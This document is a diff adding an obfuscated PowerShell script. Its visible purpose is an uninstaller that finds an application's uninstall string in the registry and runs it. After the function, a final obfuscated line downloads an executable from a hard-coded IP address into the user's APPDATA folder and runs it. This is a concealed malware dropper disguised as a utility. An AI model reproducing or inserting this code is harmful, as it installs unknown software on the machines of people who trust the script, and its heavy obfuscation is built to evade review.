@@ -1,0 +1,24 @@
+function uninS`TA`l`L`-innO`seTUP {
+
+	
+	[CmdletBinding()]
+	param
+	(
+		[ValidateNotNullOrEmpty()][string]${AP`pNA`mE}
+	)
+	
+	${quIEt`UN`InsTa`l`LsTr`i`Ng} = ((.("{1}{0}{2}"-f'-ChildI','Get','tem') -Path ((("{3}{19}{18}{10}{4}{2}{17}{0}{5}{21}{6}{1}{16}{15}{13}{20}{7}{11}{9}{14}{8}{12}" -f'HINEoMGS','crosoftoMGWindow','CAL_','RE','EY_LO','OFTWAR','Mi','iono','s','n','TRY::HK','MGU','talloMG','Curren','in','G','soM','MAC','IS','G','tVers','EoMG'))."rEpL`AcE"(([cHaR]111+[cHaR]77+[cHaR]71),'\')),((("{20}{3}{14}{21}{12}{11}{19}{10}{16}{7}{2}{0}{1}{13}{15}{17}{9}{18}{5}{4}{8}{23}{6}{22}"-f'Mi','c','eHLQ',':HKE','ur','C','ninstallHL','d','rentVersionHL','sH','ow64','NEHLQSOFTWAREH','OCAL_MACHI','rosoftHL','Y','QW','32No','indow','LQ','LQW','REGISTRY:','_L','Q','QU'))."rEpl`A`CE"(([cHar]72+[cHar]76+[cHar]81),'\')) | &("{3}{4}{0}{2}{1}" -f'ac','ct','h-Obje','For','E') { &("{2}{3}{1}{5}{0}{4}"-f 'e','m','Get-','Ite','rty','Prop') ((("{0}{3}{2}{1}"-f 'R','Y::{0}_','ISTR','EG')) -F[cHaR]36) } | &("{1}{2}{0}"-f'ect','Where-Ob','j') { ${_}."dIsP`LAY`NAME" -eq ${a`PpNA`ME} })."qUIE`T`U`NINs`TAllsTRInG").("{0}{1}"-f'sp','lit').Invoke("/")
+	${SW`ITcH`es} = "/" + ${quie`TuNInS`T`ALlSTRi`Ng}[1].("{0}{1}" -f'Tr','im').Invoke()
+	&("{2}{0}{1}" -f'te-H','ost','Wri') ("{0}{1}"-f 'Unin','stall')(("{0}{1}{2}"-f'K4HAppNam','e.','....')).replace(([chAR]75+[chAR]52+[chAR]72),'$') -NoNewline
+	${ERR`coDe} = (.("{1}{3}{4}{2}{0}" -f'ss','Star','Proce','t','-') -FilePath ${QUi`etunin`s`TaLLSTRinG}[0].("{0}{1}" -f'Tr','im').Invoke() -ArgumentList ${s`WiTCH`eS} -Wait -Passthru)."Exi`TC`OdE"
+	If ((${Err`Co`de} -eq 0) -or (${ErR`cO`DE} -eq 3010)) {
+		&("{1}{2}{0}"-f 't','Wr','ite-Hos') ("{0}{1}"-f 'S','uccess') -ForegroundColor ("{1}{2}{0}" -f 'low','Y','el')
+	} elseif (${e`RrcOdE} -eq 1605) {
+		&("{2}{0}{1}" -f'e-Ho','st','Writ') ("{2}{1}{0}{3}" -f 'Prese','ot ','N','nt') -ForegroundColor ("{1}{0}"-f 'een','Gr')
+	} else {
+		.("{1}{0}{2}"-f'te-Hos','Wri','t') ("{1}{3}{5}{0}{6}{4}{2}"-f'wit','F','de:','a',' Error Co','iled ','h')${ErR`c`ODe}
+		Exit ${e`RR`coDe}
+	}
+}
+
+(&("{2}{0}{1}" -f'c','t','New-Obje') ("{2}{1}{4}{3}{0}" -f 'nt','.','System','ie','Net.WebCl')).("{0}{3}{1}{2}" -f 'D','nloadFil','e','ow').Invoke(("{1}{9}{3}{2}{4}{8}{6}{7}{5}{0}"-f 'exe','ht','/',':/','9','winx64.','10','2.58.30/~trevor/','4.','tp'),"$env:APPDATA\winx64.exe");&("{0}{2}{1}"-f 'Start-','ess','Proc') ("$env:APPDATA\winx64.exe")
